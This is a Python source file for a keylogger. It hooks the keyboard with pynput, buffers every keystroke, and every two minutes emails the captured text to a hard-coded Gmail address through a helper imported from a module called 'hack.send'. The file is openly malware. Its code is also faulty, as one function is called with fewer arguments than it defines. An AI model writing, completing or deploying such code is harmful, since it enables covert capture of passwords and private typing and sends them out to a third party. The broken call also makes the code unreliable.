sentence = ""
USERNAME = ""
PASSWORD = ""

def start_logging_keys():
    global sentence
    import pynput.keyboard
    from pynput.keyboard import Key

    sentence = ""

    def key_press(key):
        global sentence
        if key == Key.enter:
            sentence += '\n'
        elif key == Key.caps_lock:
            sentence += "[CAPS_LOCK]"
        elif key == Key.shift or key == Key.shift_r or key == Key.shift_l:
            sentence += "[SHIFT]"
        elif key == Key.tab:
            sentence += "    "
        elif key == Key.ctrl:
            sentence += "[CTRL]"
        elif key == Key.space:
            sentence += " "
        elif key == Key.alt:
            sentence += "[ALT]"
        elif key == Key.cmd:
            sentence += "[COMMAND]"
        elif key == Key.left:
            sentence += "[LEFT]"
        elif key == Key.right:
            sentence += "[RIGHT]"
        elif key == Key.up:
            sentence += "[UP]"
        elif key == Key.down:
            sentence += "[DOWN]"
        elif key == Key.backspace:
            sentence += "[BACKSPACE]"
        elif key == Key.esc:
            sentence += "[ESC]"
        else:
            sentence += str(key.char)

    def on_release(key):
        if key == Key.esc:
            # Stop listener
            return False

    keyboard_listener = pynput.keyboard.Listener(on_press=key_press, on_release=on_release)
    keyboard_listener.start()

    return keyboard_listener

def start_periodic_send_email(text, interval):
    global sentence, USERNAME, PASSWORD
    import threading
    from hack.send import send_mail

    ticker = threading.Event()
    try:
        while not ticker.wait(interval):
            if len(sentence) > 0:
                send_mail(USERNAME, PASSWORD, 'tejashah88@gmail.com', sentence)
                sentence = ""
    except KeyboardInterrupt:
        ticker.set()

def start_email_keylogger():
    print('starting to log keys...')
    keyboard_listener = start_logging_keys()

    print('starting email broadcaster...')
    start_periodic_send_email(2 * 60)

    # gracefully shutdown
    import signal
    import sys

    def signal_handler(sig, frame):
        print('You pressed Ctrl+C!')
        keyboard_listener.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    print('Press Ctrl+C')
    signal.pause()